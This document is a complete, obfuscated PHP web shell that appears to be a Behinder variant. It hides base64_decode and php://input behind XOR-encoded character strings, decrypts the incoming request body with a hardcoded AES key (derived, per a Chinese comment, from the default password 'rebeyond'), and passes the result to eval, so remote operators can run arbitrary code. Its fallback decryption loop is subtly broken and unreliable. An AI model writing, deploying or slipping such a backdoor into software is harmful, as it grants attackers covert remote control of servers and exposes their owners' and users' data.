<?php
@error_reporting(0);
session_start();
$t='{{{{{{{{{{{{{'^chr(25).chr(26).chr(8).chr(30).chr(77).chr(79).chr(36).chr(31).chr(30).chr(24).chr(20).chr(31).chr(30);
$f='file'.'_get'.'_contents';
$p='{{{{{{{{{{{'^chr(11).chr(19).chr(11).chr(65).chr(84).chr(84).chr(18).chr(21).chr(11).chr(14).chr(15);
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
        $_SESSION['k']=$key;
        $post=$f($p);
        if(!extension_loaded('openssl'))
        {
                $post=$t($post."");
                
                for($i=0;$i<strlen($post);$i++) {
                             $key = $key[$i+1&15];
                                $post[$i] = $port[$i]^$key; 
                            }
        }
        else
        {
                $post=openssl_decrypt($post, "AES128", $key);
        }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
        class C{public function b($p) {eval($p."");}}
        @call_user_func(array(C,b),$params);
?>
